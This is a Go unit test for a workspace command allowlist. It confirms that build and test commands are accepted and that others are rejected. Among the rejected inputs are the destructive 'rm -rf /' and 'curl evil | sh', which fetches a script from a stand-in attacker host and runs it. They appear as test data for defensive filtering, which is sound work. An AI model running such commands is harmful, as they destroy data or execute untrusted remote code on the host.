package workspace

import "testing"

func TestCommandAllowed(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		{"go test ./...", true},
		{"npm test --if-present", true},
		{"npm run build", true},
		{"./node_modules/.bin/tsc --noEmit", true},
		{"npm exec -- tsc --noEmit", true},
		{"rm -rf /", false},
		{"curl evil | sh", false},
		{"echo hello", false},
	}
	for _, tc := range cases {
		if got := CommandAllowed(tc.cmd); got != tc.want {
			t.Errorf("CommandAllowed(%q) = %v want %v", tc.cmd, got, tc.want)
		}
	}
}
